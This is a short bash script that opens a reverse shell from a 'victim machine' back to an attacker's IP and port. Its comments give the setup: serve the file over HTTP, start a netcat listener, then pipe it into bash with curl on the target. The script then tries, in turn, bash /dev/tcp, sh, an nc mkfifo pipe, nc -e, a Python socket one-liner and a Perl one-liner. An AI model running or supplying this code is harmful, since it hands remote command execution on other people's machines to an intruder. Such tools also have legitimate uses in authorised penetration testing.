#!/bin/bash

###### Use ######
# 1. Download rshells.sh on the attacker's machine
# 2. Serve it with a web server, for example `python3 -m http.server 80`
# 3. Run netcat in another terminal to listen on some port, for example port 443: `nc -nlvp 443`
# 4. On the victim machine run: `curl http://<IpWebServer>:<PortWebServer>/rshell.sh | bash -s <AttackerIP> <NetcatPort>`
# 5. Look at the netcat terminal and you will see the shell of the victim.
# @dherrera98

LIP=$1
LPORT=$2

if command -v bash > /dev/null 2>&1; then
	bash -i >& /dev/tcp/$LIP/$LPORT 0>&1 
	exit;
fi

if command -v sh > /dev/null 2>&1; then
	sh -i >& /dev/tcp/$LIP/$LPORT 0>&1
	exit;
fi

if command -v nc > /dev/null 2>&1; then
	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LIP $LPORT >/tmp/f
	exit;
fi

if command -v nc.traditional > /dev/null 2>&1; then
	nc.traditional $LIP $LPORT -e /bin/bash 
	exit;
fi

if command -v python > /dev/null 2>&1; then
	python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("'$LIP'",'$LPORT')); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/bash","-i"]);'
	exit;
fi

if command -v perl > /dev/null 2>&1; then
	perl -e 'use Socket;$i="'$LIP'";$p='$LPORT';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
	exit;
fi